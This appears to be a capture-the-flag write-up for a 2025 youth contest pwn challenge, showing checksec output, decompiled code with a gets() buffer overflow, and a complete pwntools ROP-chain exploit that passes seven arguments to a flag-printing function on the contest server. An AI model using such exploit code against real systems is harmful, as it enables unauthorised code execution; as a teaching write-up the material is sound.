## Description
Pwn · Харуул Занги U18: 2025 · myagmartseren
Solved: 8 · Score: 972
nc 139.59.230.119 10367
Files:

exam

## Solution
first doing some basic file checks
```
exam: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d83ad340b3af2d1929e8167f2c29400672eb2048, for GNU/Linux 3.2.0, not stripped
```
```
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
doing looking up in ghidra found the following.
`main()` function is just buffer overflow and most interesting function here is `exam()`

```c
undefined8 main(void)

{
  char local_28 [32];
  
  logo();
  printf("> ");
  gets(local_28);
  return 0;
}
```

```c
void exam(int param_1,int param_2,int param_3,int param_4,int param_5,int param_6,int param_7)

{
  int iVar1;
  FILE *__stream;
  
  if ((((param_1 == 0) && (param_2 == -0x21520532)) && (param_3 == 0xcafe)) &&
     (((param_4 == -100 && (param_5 == 0x1111)) && ((param_6 == 0xbeef && (param_7 == 1)))))) {
    __stream = (FILE *)FUN_00401100("flag.txt",&DAT_0040335a);
    if (__stream == (FILE *)0x0) {
      printf(&DAT_00403368);
    }
    else {
      while( true ) {
        iVar1 = fgetc(__stream);
        if ((char)iVar1 == -1) break;
        putchar((int)(char)iVar1);
      }
      fclose(__stream);
    }
  }
  return;
}
```
So basically we have to pad the buffer until IP and call exam function and pass 7 parameter. If the parameter is right it just prints the flag.txt from file.

We know this is a x86-64 executable so we need to follow the x64 calling convention.
```
1-6 paratamer: RDI, RSI, RDX, RCX, R8, R9
7 and beyond : On stack
``` 
So our payload will look something like this 
```	
Padding to IP
pop rdi
parameter 1
pop rsi
parameter 2
pop rdx
parameter 3
pop rcx
parameter 4
pop r8
parameter 5
pop r9
parameter 6
exam function call
ret   <-  used for stack allignment 
parameter 7
```

ROP chain

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or 'exam',checksec=False)

host = args.HOST or '139.59.230.119'
port = int(args.PORT or 10367)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
set disassembly-flavor intel
b *0x0000000000401275+1
continue
'''.format(**locals())

# -- Exploit goes here --

context.log_level = "critical"

offset = 40

rop = ROP(exe)

# Set up arguments in registers
rop.raw(rop.find_gadget(['pop rdi', 'ret'])[0])
rop.raw(0)

rop.raw(rop.find_gadget(['pop rsi', 'ret'])[0])
rop.raw(-0x21520532 & 0xffffffffffffffff)  # sign-extend if needed

rop.raw(rop.find_gadget(['pop rdx', 'ret'])[0])
rop.raw(0xcafe)

rop.raw(rop.find_gadget(['pop rcx', 'ret'])[0])
rop.raw(-100 & 0xffffffffffffffff)

rop.raw(rop.find_gadget(['pop r8', 'ret'])[0])
rop.raw(0x1111)

rop.raw(rop.find_gadget(['pop r9', 'ret'])[0])
rop.raw(0xbeef)

# Call the function
rop.call(exe.symbols['exam'])

# Stack alignment + 7th argument on the stack
rop.raw(rop.find_gadget(['ret'])[0])
rop.raw(1)  # 7th param on stack


payload = flat({
    offset: rop.chain()
})

io = start()

io.recvuntil(b"> ")
io.sendline(payload)

flag = io.recv().strip().decode()
print(flag)

io.close()

```